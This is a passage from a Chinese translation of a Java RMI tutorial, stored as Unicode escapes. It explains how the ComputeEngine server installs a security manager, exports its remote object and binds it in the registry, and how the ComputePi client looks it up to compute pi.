\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5219\u63a5\u6536\u65b9\u5c06\u53ea\u80fd\u8bbf\u95ee\u8ba1\u7b97\u5f15\u64ce\u7684 executeTask \u65b9\u6cd5\u3002\u8be5\u63a5\u6536\u8005\u5c06\u770b\u4e0d\u5230 ComputeEngine \u6784\u9020\u51fd\u6570\uff0c\u5176 main \u65b9\u6cd5\u6216 java.lang.Object \u7684\u4efb\u4f55\u65b9\u6cd5\u7684\u5b9e\u73b0\u3002 \u5728\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u4e2d\uff0c\u4e0d\u662f\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5bf9\u8c61\u5c06\u6309\u503c\u4f20\u9012\u3002\u56e0\u6b64\uff0c\u5728\u63a5\u6536 Java \u865a\u62df\u673a\u4e2d\u521b\u5efa\u5bf9\u8c61\u7684\u526f\u672c\u3002\u63a5\u6536\u8005\u5bf9\u5bf9\u8c61\u72b6\u6001\u7684\u4efb\u4f55\u66f4\u6539\u4ec5\u53cd\u6620\u5728\u63a5\u6536\u8005\u7684\u526f\u672c\u4e2d\uff0c\u800c\u4e0d\u53cd\u6620\u5728\u53d1\u9001\u8005\u7684\u539f\u59cb\u5b9e\u4f8b\u4e2d\u3002\u53d1\u9001\u8005\u5bf9\u5bf9\u8c61\u72b6\u6001\u7684\u4efb\u4f55\u66f4\u6539\u4ec5\u53cd\u6620\u5728\u53d1\u9001\u8005\u7684\u539f\u59cb\u5b9e\u4f8b\u4e2d\uff0c\u800c\u4e0d\u53cd\u6620\u5728\u63a5\u6536\u8005\u7684\u526f\u672c\u4e2d\u3002 4.2.5. \u5b9e\u73b0\u670d\u52a1\u5668\u7aef\u7684main\u65b9\u6cd5 # ComputeEngine \u5b9e\u73b0\u4e2d\u6700\u590d\u6742\u7684\u65b9\u6cd5\u662f main \u65b9\u6cd5\u3002 \u4e3b\u8981\u65b9\u6cd5\u7528\u4e8e\u542f\u52a8 ComputeEngine \uff0c\u56e0\u6b64\u9700\u8981\u8fdb\u884c\u5fc5\u8981\u7684\u521d\u59cb\u5316\u7b49\u7b49\uff0c\u4ee5\u4f7f\u670d\u52a1\u5668\u51c6\u5907\u597d\u63a5\u53d7\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u8c03\u7528\u3002 \u6b64\u65b9\u6cd5\u4e0d\u662f\u8fdc\u7a0b\u65b9\u6cd5\uff0c\u8fd9\u610f\u5473\u7740\u65e0\u6cd5\u4ece\u5176\u4ed6 Java \u865a\u62df\u673a\u8c03\u7528\u5b83\u3002 \u7531\u4e8e main \u65b9\u6cd5\u88ab\u58f0\u660e\u4e3a\u9759\u6001\u65b9\u6cd5\uff0c\u56e0\u6b64\u8be5\u65b9\u6cd5\u6839\u672c\u4e0d\u4e0e\u5bf9\u8c61\u5173\u8054\uff0c\u800c\u662f\u4e0e ComputeEngine \u7c7b\u5173\u8054\u3002 4.2.6. \u521b\u5efa\u548c\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668 # \u4e3b\u8981\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1\u662f\u521b\u5efa\u5e76\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\uff0c\u4ee5\u4fdd\u62a4\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u4e0d\u53d7 Java \u865a\u62df\u673a\u4e2d\u8fd0\u884c\u7684\u4e0d\u53ef\u4fe1\u4e0b\u8f7d\u4ee3\u7801\u7684\u8bbf\u95ee\u3002 \u5b89\u5168\u7ba1\u7406\u5668\u786e\u5b9a\u4e0b\u8f7d\u7684\u4ee3\u7801\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u6216\u53ef\u4ee5\u6267\u884c\u4efb\u4f55\u5176\u4ed6\u7279\u6743\u64cd\u4f5c\u3002 \u5982\u679c RMI \u7a0b\u5e8f\u672a\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\uff0c\u5219 RMI \u5c06\u4e0d\u4f1a\u4e0b\u8f7d\u4f5c\u4e3a\u81ea\u53d8\u91cf\u63a5\u6536\u5230\u7684\u5bf9\u8c61\u6216\u4ece\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u8fd4\u56de\u503c\u7684\u5bf9\u8c61\u7684\u7c7b\uff08\u4ece\u672c\u5730\u7c7b\u8def\u5f84\u4e4b\u5916\uff09\u3002 \u6b64\u9650\u5236\u786e\u4fdd\u4e86\u7531\u4e0b\u8f7d\u7684\u4ee3\u7801\u6267\u884c\u7684\u64cd\u4f5c\u5fc5\u987b\u9075\u5b88\u5b89\u5168\u7b56\u7565\u3002 \u8fd9\u662f\u521b\u5efa\u548c\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\u7684\u4ee3\u7801\uff1a if (System.getSecurityManager() == null) { System.setSecurityManager(new SecurityManager()); } 4.2.7. \u4f7f\u8fdc\u7a0b\u5bf9\u8c61\u53ef\u4f9b\u5ba2\u6237\u7aef\u4f7f\u7528 # \u63a5\u4e0b\u6765\uff0c main \u65b9\u6cd5\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u521b\u5efa ComputeEngine \u5b9e\u4f8b\u5e76\u5c06\u5176\u5bfc\u51fa\u5230 RMI \u8fd0\u884c\u65f6\uff1a Compute engine = new ComputeEngine(); Compute stub = (Compute) UnicastRemoteObject.exportObject(engine, 0); \u9759\u6001 UnicastRemoteObject.exportObject \u65b9\u6cd5\u5bfc\u51fa\u63d0\u4f9b\u7684\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u4ee5\u4fbf\u5b83\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u5ba2\u6237\u7aef\u63a5\u6536\u5176\u8fdc\u7a0b\u65b9\u6cd5\u7684\u8c03\u7528\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570int\u6307\u5b9a\u7528\u4e8e\u4fa6\u542c\u8be5\u5bf9\u8c61\u7684\u4f20\u5165\u8fdc\u7a0b\u8c03\u7528\u8bf7\u6c42\u7684TCP\u7aef\u53e3\u3002\u901a\u5e38\u4f7f\u7528\u96f6\u503c\uff0c\u8be5\u503c\u6307\u5b9a\u4f7f\u7528\u533f\u540d\u7aef\u53e3\u3002\u7136\u540e\uff0c\u5b9e\u9645\u7aef\u53e3\u5c06\u5728\u8fd0\u884c\u65f6\u7531RMI\u6216\u57fa\u7840\u64cd\u4f5c\u7cfb\u7edf\u9009\u62e9\u3002\u4f46\u662f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u975e\u96f6\u503c\u6765\u6307\u5b9a\u7528\u4e8e\u4fa6\u542c\u7684\u7279\u5b9a\u7aef\u53e3\u3002\u6210\u529f\u5bfc\u51fa exportObject \u8c03\u7528\u540e\uff0c ComputeEngine \u8fdc\u7a0b\u5bf9\u8c61\u5df2\u51c6\u5907\u5c31\u7eea\uff0c\u53ef\u4ee5\u5904\u7406\u4f20\u5165\u7684\u8fdc\u7a0b\u8c03\u7528\u3002 exportObject \u65b9\u6cd5\u8fd4\u56de\u5bfc\u51fa\u7684\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\u3002\u8bf7\u6ce8\u610f\uff0c\u53d8\u91cf\u5b58\u6839\u7684\u7c7b\u578b\u5fc5\u987b\u662f Compute \uff0c\u800c\u4e0d\u662f ComputeEngine \uff0c\u56e0\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\u4ec5\u5b9e\u73b0\u5bfc\u51fa\u7684\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7684\u8fdc\u7a0b\u63a5\u53e3\u3002 exportObject \u65b9\u6cd5\u58f0\u660e\u5b83\u53ef\u4ee5\u5f15\u53d1 RemoteException \uff0c\u8fd9\u662f\u4e00\u4e2a\u7ecf\u8fc7\u68c0\u67e5\u7684\u5f02\u5e38\u7c7b\u578b\u3002 main \u65b9\u6cd5\u4f7f\u7528\u5176 try / catch \u5757\u5904\u7406\u6b64\u5f02\u5e38\u3002\u5982\u679c\u672a\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5904\u7406\u5f02\u5e38\uff0c\u5219\u5fc5\u987b\u5728 main \u65b9\u6cd5\u7684 throws \u5b50\u53e5\u4e2d\u58f0\u660e RemoteException \u3002\u5982\u679c\u6ca1\u6709\u5fc5\u8981\u7684\u901a\u4fe1\u8d44\u6e90\uff08\u4f8b\u5982\uff0c\u8bf7\u6c42\u7684\u7aef\u53e3\u7ed1\u5b9a\u7528\u4e8e\u5176\u4ed6\u76ee\u7684\uff09\uff0c\u5219\u5c1d\u8bd5\u5bfc\u51fa\u8fdc\u7a0b\u5bf9\u8c61\u53ef\u80fd\u4f1a\u5f15\u53d1 RemoteException \u3002 \u5728\u5ba2\u6237\u7aef\u53ef\u4ee5\u5728\u8fdc\u7a0b\u5bf9\u8c61\u4e0a\u8c03\u7528\u65b9\u6cd5\u4e4b\u524d\uff0c\u5ba2\u6237\u7aef\u5fc5\u987b\u9996\u5148\u83b7\u53d6\u5bf9\u8be5\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u53ef\u4ee5\u901a\u8fc7\u5728\u7a0b\u5e8f\u4e2d\u83b7\u5f97\u4efb\u4f55\u5176\u4ed6\u5bf9\u8c61\u5f15\u7528\u7684\u65b9\u5f0f\u6765\u83b7\u5f97\u5f15\u7528\uff0c\u4f8b\u5982\u901a\u8fc7\u5c06\u5f15\u7528\u4f5c\u4e3a\u65b9\u6cd5\u8fd4\u56de\u503c\u7684\u4e00\u90e8\u5206\u6216\u5305\u542b\u6b64\u7c7b\u5f15\u7528\u7684\u6570\u636e\u7ed3\u6784\u7684\u4e00\u90e8\u5206\u6765\u83b7\u53d6\u3002 \u7cfb\u7edf\u63d0\u4f9b\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684\u8fdc\u7a0b\u5bf9\u8c61RMI\u6ce8\u518c\u8868\uff0c\u7528\u4e8e\u67e5\u627e\u5bf9\u5176\u4ed6\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002 RMI\u6ce8\u518c\u8868\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8fdc\u7a0b\u5bf9\u8c61\u547d\u540d\u670d\u52a1\uff0c\u4f7f\u5ba2\u6237\u7aef\u80fd\u591f\u901a\u8fc7\u540d\u79f0\u83b7\u5f97\u5bf9\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u6ce8\u518c\u8868\u901a\u5e38\u4ec5\u7528\u4e8e\u67e5\u627eRMI\u5ba2\u6237\u7aef\u9700\u8981\u4f7f\u7528\u7684\u7b2c\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u3002\u7136\u540e\uff0c\u7b2c\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u53ef\u80fd\u4f1a\u4e3a\u67e5\u627e\u5176\u4ed6\u5bf9\u8c61\u63d0\u4f9b\u652f\u6301\u3002 java.rmi.registry.Registry \u8fdc\u7a0b\u63a5\u53e3\u662f\u7528\u4e8e\u7ed1\u5b9a\uff08\u6216\u6ce8\u518c\uff09\u548c\u5728\u6ce8\u518c\u8868\u4e2d\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\u7684API\u3002 java.rmi.registry.LocateRegistry \u7c7b\u63d0\u4f9b\u4e86\u9759\u6001\u65b9\u6cd5\uff0c\u7528\u4e8e\u5408\u6210\u5bf9\u7279\u5b9a\u7f51\u7edc\u5730\u5740\uff08\u4e3b\u673a\u548c\u7aef\u53e3\uff09\u4e0a\u6ce8\u518c\u8868\u7684\u8fdc\u7a0b\u5f15\u7528\u3002\u8fd9\u4e9b\u65b9\u6cd5\u5c06\u521b\u5efa\u5305\u542b\u6307\u5b9a\u7f51\u7edc\u5730\u5740\u7684\u8fdc\u7a0b\u5f15\u7528\u5bf9\u8c61\uff0c\u800c\u4e0d\u6267\u884c\u4efb\u4f55\u8fdc\u7a0b\u901a\u4fe1\u3002 LocateRegistry \u8fd8\u63d0\u4f9b\u4e86\u7528\u4e8e\u5728\u5f53\u524d Java \u865a\u62df\u673a\u4e2d\u521b\u5efa\u65b0\u6ce8\u518c\u8868\u7684\u9759\u6001\u65b9\u6cd5\uff0c\u5c3d\u7ba1\u672c\u793a\u4f8b\u672a\u4f7f\u7528\u8fd9\u4e9b\u65b9\u6cd5\u3002\u5728\u672c\u5730\u4e3b\u673a\u4e0a\u7684RMI\u6ce8\u518c\u8868\u4e2d\u6ce8\u518c\u4e86\u8fdc\u7a0b\u5bf9\u8c61\u540e\uff0c\u4efb\u4f55\u4e3b\u673a\u4e0a\u7684\u5ba2\u6237\u7aef\u90fd\u53ef\u4ee5\u6309\u540d\u79f0\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u83b7\u53d6\u5176\u5f15\u7528\uff0c\u7136\u540e\u5728\u8be5\u5bf9\u8c61\u4e0a\u8c03\u7528\u8fdc\u7a0b\u65b9\u6cd5\u3002\u6ce8\u518c\u8868\u53ef\u4ee5\u7531\u4e3b\u673a\u4e0a\u8fd0\u884c\u7684\u6240\u6709\u670d\u52a1\u5668\u5171\u4eab\uff0c\u6216\u8005\u5355\u4e2a\u670d\u52a1\u5668\u8fdb\u7a0b\u53ef\u4ee5\u521b\u5efa\u548c\u4f7f\u7528\u5176\u81ea\u5df1\u7684\u6ce8\u518c\u8868\u3002 ComputeEngine \u7c7b\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u4e3a\u5bf9\u8c61\u521b\u5efa\u540d\u79f0\uff1a String name = \"Compute\"; \u7136\u540e\uff0c\u4ee3\u7801\u5c06\u540d\u79f0\u6dfb\u52a0\u5230\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684RMI\u6ce8\u518c\u8868\u4e2d\u3002 \u7a0d\u540e\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b8c\u6210\u6b64\u6b65\u9aa4\uff1a Registry registry = LocateRegistry.getRegistry(); registry.rebind(name, stub); \u6b64\u91cd\u65b0\u7ed1\u5b9a\u8c03\u7528\u5bf9\u672c\u5730\u4e3b\u673a\u4e0a\u7684 RMI \u6ce8\u518c\u8868\u8fdb\u884c\u4e86\u8fdc\u7a0b\u8c03\u7528\u3002\u50cf\u4efb\u4f55\u8fdc\u7a0b\u8c03\u7528\u4e00\u6837\uff0c\u6b64\u8c03\u7528\u53ef\u80fd\u5bfc\u81f4\u5f15\u53d1 RemoteException \uff0c\u8be5\u5f02\u5e38\u7531 main \u65b9\u6cd5\u672b\u5c3e\u7684 catch \u5757\u5904\u7406\u3002 \u8bf7\u6ce8\u610f\u4ee5\u4e0b\u6709\u5173 Registry.rebind \u8c03\u7528\u7684\u5185\u5bb9\uff1a LocateRegistry.getRegistry \u7684\u65e0\u53c2\u6570\u91cd\u8f7d\u5c06\u5bf9\u672c\u5730\u4e3b\u673a\u548c\u9ed8\u8ba4\u6ce8\u518c\u8868\u7aef\u53e3 1099 \u4e0a\u6ce8\u518c\u8868\u7684\u5f15\u7528\u8fdb\u884c\u7efc\u5408\u3002\u5982\u679c\u5728 1099 \u4ee5\u5916\u7684\u7aef\u53e3\u4e0a\u521b\u5efa\u4e86\u6ce8\u518c\u8868\uff0c\u5219\u5fc5\u987b\u4f7f\u7528\u5177\u6709 int \u53c2\u6570\u7684\u91cd\u8f7d\u3002 \u5728\u6ce8\u518c\u8868\u4e0a\u8fdb\u884c\u8fdc\u7a0b\u8c03\u7528\u65f6\uff0c\u5c06\u4f20\u9012\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\u800c\u4e0d\u662f\u8fdc\u7a0b\u5bf9\u8c61\u672c\u8eab\u7684\u526f\u672c\u3002\u8bf8 ComputeEngine \u5b9e\u4f8b\u4e4b\u7c7b\u7684\u8fdc\u7a0b\u5b9e\u73b0\u5bf9\u8c61\u6c38\u8fdc\u4e0d\u4f1a\u79bb\u5f00\u521b\u5efa\u5b83\u4eec\u7684 Java \u865a\u62df\u673a\u3002\u56e0\u6b64\uff0c\u5f53\u5ba2\u6237\u7aef\u5728\u670d\u52a1\u5668\u7684\u8fdc\u7a0b\u5bf9\u8c61\u6ce8\u518c\u8868\u4e2d\u6267\u884c\u67e5\u627e\u65f6\uff0c\u5c06\u8fd4\u56de\u5b58\u6839\u7684\u526f\u672c\u3002\u56e0\u6b64\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u5bf9\u8c61\u901a\u8fc7\uff08\u8fdc\u7a0b\uff09\u5f15\u7528\u800c\u4e0d\u662f\u901a\u8fc7\u503c\u6709\u6548\u5730\u4f20\u9012\u3002 \u51fa\u4e8e\u5b89\u5168\u539f\u56e0\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ea\u80fd\u4e0e\u5728\u540c\u4e00\u4e3b\u673a\u4e0a\u8fd0\u884c\u7684\u6ce8\u518c\u8868\u7ed1\u5b9a\uff0c\u53d6\u6d88\u7ed1\u5b9a\u6216\u91cd\u65b0\u7ed1\u5b9a\u8fdc\u7a0b\u5bf9\u8c61\u5f15\u7528\u3002\u6b64\u9650\u5236\u53ef\u9632\u6b62\u8fdc\u7a0b\u5ba2\u6237\u7aef\u5220\u9664\u6216\u8986\u76d6\u670d\u52a1\u5668\u6ce8\u518c\u8868\u4e2d\u7684\u4efb\u4f55\u6761\u76ee\u3002\u4f46\u662f\uff0c\u53ef\u4ee5\u4ece\u4efb\u4f55\u672c\u5730\u6216\u8fdc\u7a0b\u4e3b\u673a\u8bf7\u6c42\u67e5\u627e\u3002 \u670d\u52a1\u5668\u5728\u672c\u5730 RMI \u6ce8\u518c\u8868\u4e2d\u6ce8\u518c\u540e\uff0c\u5c06\u663e\u793a\u4e00\u6761\u6d88\u606f\uff0c\u8868\u660e\u5b83\u5df2\u51c6\u5907\u597d\u5f00\u59cb\u5904\u7406\u547c\u53eb\u3002\u7136\u540e\uff0c main \u65b9\u6cd5\u5b8c\u6210\u3002\u4e0d\u5fc5\u7b49\u5f85\u7ebf\u7a0b\u4f7f\u670d\u52a1\u5668\u4fdd\u6301\u6d3b\u52a8\u72b6\u6001\u3002\u53ea\u8981\u5728\u672c\u5730\u6216\u8fdc\u7a0b\u7684\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u4e2d\u5f15\u7528\u4e86 ComputeEngine \u5bf9\u8c61\uff0c\u5c31\u4e0d\u4f1a\u5173\u95ed ComputeEngine \u5bf9\u8c61\u6216\u5bf9\u5176\u8fdb\u884c\u5783\u573e\u56de\u6536\u3002\u7531\u4e8e\u7a0b\u5e8f\u5c06\u5bf9\u6ce8\u518c\u8868\u7684\u5f15\u7528\u7ed1\u5b9a\u5230\u6ce8\u518c\u8868\u4e2d\uff0c\u56e0\u6b64\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u5ba2\u6237\u7aef\uff08\u6ce8\u518c\u8868\u672c\u8eab\uff09\u8bbf\u95ee\u5b83\u3002 RMI \u7cfb\u7edf\u4f7f ComputeEngine \u7684\u8fdb\u7a0b\u4fdd\u6301\u8fd0\u884c\u72b6\u6001\u3002 ComputeEngine \u53ef\u7528\u4e8e\u63a5\u53d7\u547c\u53eb\uff0c\u76f4\u5230\u5c06\u5176\u7ed1\u5b9a\u4ece\u6ce8\u518c\u8868\u4e2d\u5220\u9664\u5e76\u4e14\u6ca1\u6709\u8fdc\u7a0b\u5ba2\u6237\u7aef\u62e5\u6709\u5bf9 ComputeEngine \u5bf9\u8c61\u7684\u8fdc\u7a0b\u5f15\u7528\u4e4b\u524d\uff0c\u5b83\u4e0d\u4f1a\u88ab\u56de\u6536\u3002 ComputeEngine.main \u65b9\u6cd5\u4e2d\u7684\u6700\u540e\u4e00\u6bb5\u4ee3\u7801\u5c06\u5904\u7406\u53ef\u80fd\u51fa\u73b0\u7684\u4efb\u4f55\u5f02\u5e38\u3002\u53ef\u4ee5\u5728\u4ee3\u7801\u4e2d\u5f15\u53d1\u7684\u552f\u4e00\u68c0\u67e5\u7684\u5f02\u5e38\u7c7b\u578b\u662f RemoteException \uff0c\u53ef\u4ee5\u901a\u8fc7 UnicastRemoteObject.exportObject \u8c03\u7528\u6216\u901a\u8fc7\u6ce8\u518c\u8868\u91cd\u65b0\u7ed1\u5b9a\u8c03\u7528\u6765\u5b9e\u73b0\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u8be5\u7a0b\u5e8f\u90fd\u53ea\u80fd\u6267\u884c\u6253\u5370\u9519\u8bef\u6d88\u606f\u540e\u9000\u51fa\u7684\u64cd\u4f5c\u3002\u5728\u67d0\u4e9b\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u4ece\u6545\u969c\u4e2d\u6062\u590d\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u8c03\u7528\u3002\u4f8b\u5982\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u5c1d\u8bd5\u91cd\u8bd5\u8be5\u64cd\u4f5c\uff0c\u6216\u8005\u9009\u62e9\u53e6\u4e00\u53f0\u670d\u52a1\u5668\u7ee7\u7eed\u8be5\u64cd\u4f5c\u3002 5. \u5982\u4f55\u521b\u5efa\u4e00\u4e2a RMI \u5ba2\u6237\u7aef # \u8ba1\u7b97\u5f15\u64ce\u662f\u4e00\u4e2a\u76f8\u5bf9\u7b80\u5355\u7684\u7a0b\u5e8f\uff1a\u5b83\u8fd0\u884c\u4f20\u9012\u7ed9\u5b83\u7684\u4efb\u52a1\u3002 \u8ba1\u7b97\u5f15\u64ce\u7684\u5ba2\u6237\u7aef\u66f4\u4e3a\u590d\u6742\u3002\u5ba2\u6237\u7aef\u9700\u8981\u8c03\u7528\u8ba1\u7b97\u5f15\u64ce\uff0c\u4f46\u8fd8\u5fc5\u987b\u5b9a\u4e49\u8981\u7531\u8ba1\u7b97\u5f15\u64ce\u6267\u884c\u7684\u4efb\u52a1\u3002 \u5728\u6211\u4eec\u7684\u793a\u4f8b\u4e2d\uff0c\u4e24\u4e2a\u5355\u72ec\u7684\u7c7b\u6784\u6210\u4e86\u5ba2\u6237\u7aef\u3002\u7b2c\u4e00\u4e2a\u7c7b ComputePi \u67e5\u627e\u5e76\u8c03\u7528 Compute \u5bf9\u8c61\u3002\u7b2c\u4e8c\u4e2a\u7c7b\uff0c Pi \uff0c\u5b9e\u73b0\u4e86 Task \u63a5\u53e3\u5e76\u5b9a\u4e49\u4e86\u8ba1\u7b97\u5f15\u64ce\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u3002 Pi \u7c7b\u7684\u5de5\u4f5c\u662f\u5c06 \\pi \u7b26\u53f7\u7684\u503c\u8ba1\u7b97\u4e3a\u5c0f\u6570\u4f4d\u6570\u3002 \u975e\u8fdc\u7a0b\u4efb\u52a1\u63a5\u53e3\u5b9a\u4e49\u5982\u4e0b\uff1a package compute; public interface Task<T> { T execute(); } \u8c03\u7528 Compute \u5bf9\u8c61\u7684\u65b9\u6cd5\u7684\u4ee3\u7801\u5fc5\u987b\u83b7\u5f97\u5bf9\u8be5\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u521b\u5efa Task \u5bf9\u8c61\uff0c\u7136\u540e\u8bf7\u6c42\u6267\u884c\u8be5\u4efb\u52a1\u3002 \u4efb\u52a1\u7c7b Pi \u7684\u5b9a\u4e49\u5728\u540e\u9762\u793a\u51fa\u3002 Pi \u5bf9\u8c61\u4f7f\u7528\u5355\u4e2a\u53c2\u6570\uff08\u7ed3\u679c\u7684\u6240\u9700\u7cbe\u5ea6\uff09\u6784\u9020\u3002\u4efb\u52a1\u6267\u884c\u7684\u7ed3\u679c\u662f java.math.BigDecimal \uff0c\u8868\u793a\u4ee5\u6307\u5b9a\u7684\u7cbe\u5ea6\u8ba1\u7b97\u51fa\u7684 \\pi \u7b26\u53f7\u3002 \u8fd9\u662f\u4e3b\u8981\u5ba2\u6237\u7aef\u7c7b client.ComputePi \u7684\u6e90\u4ee3\u7801\uff1a package client; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.math.BigDecimal; import compute.Compute; public class ComputePi { public static void main(String args[]) { if (System.getSecurityManager() == null) { System.setSecurityManager(new SecurityManager()); } try { String name = \"Compute\"; Registry registry = LocateRegistry.getRegistry(args[0]); Compute comp = (Compute) registry.lookup(name); Pi task = new Pi(Integer.parseInt(args[1])); BigDecimal pi = comp.executeTask(task); System.out.println(pi); } catch (Exception e) { System.err.println(\"ComputePi exception:\"); e.printStackTrace(); } } } \u4e0e ComputeEngine \u670d\u52a1\u5668\u4e00\u6837\uff0c\u5ba2\u6237\u7aef\u4ece\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\u5f00\u59cb\u3002\u6b64\u6b65\u9aa4\u662f\u5fc5\u9700\u7684\uff0c\u56e0\u4e3a\u63a5\u6536\u670d\u52a1\u5668\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\u7684\u8fc7\u7a0b\u53ef\u80fd\u9700\u8981\u4ece\u670d\u52a1\u5668\u4e0b\u8f7d\u7c7b\u5b9a\u4e49\u3002\u8981\u4f7fRMI\u4e0b\u8f7d\u7c7b\uff0c\u5fc5\u987b\u542f\u7528\u5b89\u5168\u7ba1\u7406\u5668\u3002 \u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668\u540e\uff0c\u5ba2\u6237\u7aef\u5c06\u4f7f\u7528 ComputeEngine \u7528\u6765\u7ed1\u5b9a\u5176\u8fdc\u7a0b\u5bf9\u8c61\u7684\u76f8\u540c\u540d\u79f0\u6765\u6784\u5efa\u7528\u4e8e\u67e5\u627e Compute \u8fdc\u7a0b\u5bf9\u8c61\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528 LocateRegistry.getRegistry API \u6765\u5408\u6210\u5bf9\u670d\u52a1\u5668\u4e3b\u673a\u4e0a\u6ce8\u518c\u8868\u7684\u8fdc\u7a0b\u5f15\u7528\u3002\u7b2c\u4e00\u4e2a\u547d\u4ee4\u884c\u53c2\u6570 args [0] \u7684\u503c\u662f\u8fd0\u884c Compute \u5bf9\u8c61\u7684\u8fdc\u7a0b\u4e3b\u673a\u7684\u540d\u79f0\u3002\u7136\u540e\uff0c\u5ba2\u6237\u7aef\u5728\u6ce8\u518c\u8868\u4e0a\u8c03\u7528 lookup \u65b9\u6cd5\uff0c\u4ee5\u5728\u670d\u52a1\u5668\u4e3b\u673a\u7684\u6ce8\u518c\u8868\u4e2d\u6309\u540d\u79f0\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\u3002\u4f7f\u7528\u7684 LocateRegistry.getRegistry \u7684\u7279\u5b9a\u91cd\u8f7d\uff08\u5177\u6709\u5355\u4e2a String \u53c2\u6570\uff09\u8fd4\u56de\u5bf9\u547d\u540d\u4e3b\u673a\u548c\u9ed8\u8ba4\u6ce8\u518c\u8868\u7aef\u53e3 1099 \u5904\u7684\u6ce8\u518c\u8868\u7684\u5f15\u7528\u3002\u5982\u679c\u5728 1099 \u4ee5\u5916\u7684\u7aef\u53e3\u521b\u5efa\u4e86\u6ce8\u518c\u8868\uff0c\u5219\u5fc5\u987b\u4f7f\u7528\u5177\u6709 int \u53c2\u6570\u7684\u91cd\u8f7d\u3002 \u63a5\u4e0b\u6765\uff0c\u5ba2\u6237\u7aef\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Pi \u5bf9\u8c61\uff0c\u5c06\u89e3\u6790\u4e3a\u6574\u6570\u7684\u7b2c\u4e8c\u4e2a\u547d\u4ee4\u884c\u53c2\u6570 args [1] \u7684\u503c\u4f20\u9012\u7ed9 Pi \u6784\u9020\u51fd\u6570\u3002\u6b64\u53c2\u6570\u6307\u793a\u5728\u8ba1\u7b97\u4e2d\u4f7f\u7528\u7684\u5c0f\u6570\u4f4d\u6570\u3002\u6700\u540e\uff0c\u5ba2\u6237\u7aef\u8c03\u7528 Compute \u8fdc\u7a0b\u5bf9\u8c61\u7684 executeTask \u65b9\u6cd5\u3002\u4f20\u9012\u7ed9 executeTask \u8c03\u7528\u7684\u5bf9\u8c61\u5c06\u8fd4\u56de BigDecimal \u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u5176\u5b58\u50a8\u5728\u53d8\u91cf result \u4e2d\u3002\u6700\u540e\uff0c\u7a0b\u5e8f\u5c06\u6253\u5370\u7ed3\u679c\u3002\u4e0b\u56fe\u63cf\u8ff0\u4e86 ComputePi \u5ba2\u6237\u7aef\uff0c rmiregistry \u548c ComputeEngine \u4e4b\u95f4\u7684\u6d88\u606f\u6d41\u3002 \\text{Figure 5. \u6d88\u606f\u6d41} Pi \u7c7b\u5b9e\u73b0 Task \u63a5\u53e3\uff0c\u5e76\u5c06 \\pi 